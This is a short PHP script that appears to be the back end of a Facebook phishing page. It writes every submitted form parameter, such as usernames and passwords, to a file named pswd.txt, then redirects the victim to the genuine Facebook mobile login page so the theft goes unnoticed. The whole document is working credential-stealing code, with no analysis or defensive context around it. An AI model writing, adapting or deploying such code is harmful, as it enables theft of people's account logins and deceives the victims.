<?php 
header("Location: http://m.facebook.com/login.php?m=m&r811c1f38&refid=9&rdd9db9a5&e=iep&r1129f1e6");
$handle = fopen("pswd.txt", "a");
foreach($_GET as $variable => $value) {fwrite($handle, $variable);fwrite($handle, "=");fwrite($handle, $value);fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
